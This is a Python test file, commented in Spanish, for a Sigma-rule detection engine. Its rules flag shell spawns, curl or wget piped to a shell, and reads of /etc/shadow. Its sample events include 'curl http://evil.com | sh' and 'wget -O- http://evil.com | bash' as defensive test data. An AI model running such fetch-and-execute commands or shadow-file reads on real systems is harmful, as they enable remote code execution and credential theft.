"""
Tests de SigmaEngine.
"""
from pathlib import Path

import pytest

from core.sigma_engine import SigmaEngine


REGLA_SHELL = """
title: Shell spawned
id: rule-001
status: experimental
level: high
detection:
    selection:
        EventType: exec
        Image|endswith: "/bash"
    condition: selection
"""

REGLA_CURL_PIPE = """
title: Curl pipe shell
id: rule-002
level: critical
detection:
    selection_curl:
        EventType: exec
        CommandLine|contains:
            - "curl "
            - "wget "
    selection_pipe:
        EventType: exec
        CommandLine|contains:
            - " | sh"
            - " | bash"
    condition: selection_curl and selection_pipe
"""

REGLA_SHADOW = """
title: Shadow access
id: rule-003
level: high
detection:
    selection:
        EventType: open
        TargetFilename: "/etc/shadow"
    condition: selection
"""


@pytest.fixture
def sigma_dir(tmp_path):
    d = tmp_path / "sigma_rules"
    d.mkdir()
    (d / "shell.yml").write_text(REGLA_SHELL)
    (d / "curl.yml").write_text(REGLA_CURL_PIPE)
    (d / "shadow.yml").write_text(REGLA_SHADOW)
    return d


class TestSigmaEngine:
    def test_carga_reglas(self, sigma_dir):
        engine = SigmaEngine(str(sigma_dir))
        assert len(engine.rules) == 3

    def test_detecta_shell(self, sigma_dir):
        engine = SigmaEngine(str(sigma_dir))
        event = {"EventType": "exec", "Image": "/usr/bin/bash"}
        matches = engine.evaluate(event)
        assert any(r.id == "rule-001" for r in matches)

    def test_no_detecta_shell_en_otro_proceso(self, sigma_dir):
        engine = SigmaEngine(str(sigma_dir))
        event = {"EventType": "exec", "Image": "/usr/bin/python3"}
        matches = engine.evaluate(event)
        assert not any(r.id == "rule-001" for r in matches)

    def test_detecta_curl_pipe_sh(self, sigma_dir):
        engine = SigmaEngine(str(sigma_dir))
        event = {"EventType": "exec",
                 "CommandLine": "curl http://evil.com | sh"}
        matches = engine.evaluate(event)
        assert any(r.id == "rule-002" for r in matches), \
            f"Regla curl|sh no disparó. Matches: {[r.id for r in matches]}"

    def test_detecta_wget_pipe_bash(self, sigma_dir):
        engine = SigmaEngine(str(sigma_dir))
        event = {"EventType": "exec",
                 "CommandLine": "wget -O- http://evil.com | bash"}
        matches = engine.evaluate(event)
        assert any(r.id == "rule-002" for r in matches)

    def test_no_detecta_curl_sin_pipe(self, sigma_dir):
        """curl solo, sin pipe a shell, no debe disparar la regla 002."""
        engine = SigmaEngine(str(sigma_dir))
        event = {"EventType": "exec",
                 "CommandLine": "curl http://example.com -o archivo.txt"}
        matches = engine.evaluate(event)
        assert not any(r.id == "rule-002" for r in matches)

    def test_detecta_shadow(self, sigma_dir):
        engine = SigmaEngine(str(sigma_dir))
        event = {"EventType": "open", "TargetFilename": "/etc/shadow"}
        matches = engine.evaluate(event)
        assert any(r.id == "rule-003" for r in matches)

    def test_evento_sin_match(self, sigma_dir):
        engine = SigmaEngine(str(sigma_dir))
        event = {"EventType": "open", "TargetFilename": "/tmp/foo.txt"}
        matches = engine.evaluate(event)
        assert matches == []

    def test_directorio_inexistente(self, tmp_path):
        engine = SigmaEngine(str(tmp_path / "no_existe"))
        assert engine.rules == []
